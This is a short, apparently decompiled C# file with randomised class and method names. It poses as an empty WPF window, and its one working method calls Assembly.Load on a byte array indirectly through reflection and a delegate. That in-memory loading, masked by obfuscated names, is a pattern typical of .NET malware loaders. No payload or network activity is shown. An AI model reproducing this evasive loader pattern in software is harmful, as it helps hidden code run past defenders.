using System;
using System.Reflection;
using System.Windows;
using System.Windows.Markup;

namespace mbtjidrq;

public class rryzqndl : Window, IComponentConnector
{
	internal delegate Assembly bhtvkdxx(byte[] byte_0);

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] jcekricc)
	{
		return ((bhtvkdxx)Delegate.CreateDelegate(typeof(bhtvkdxx), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(jcekricc);
	}

	private void v(int connectionId, object target)
	{
	}
}
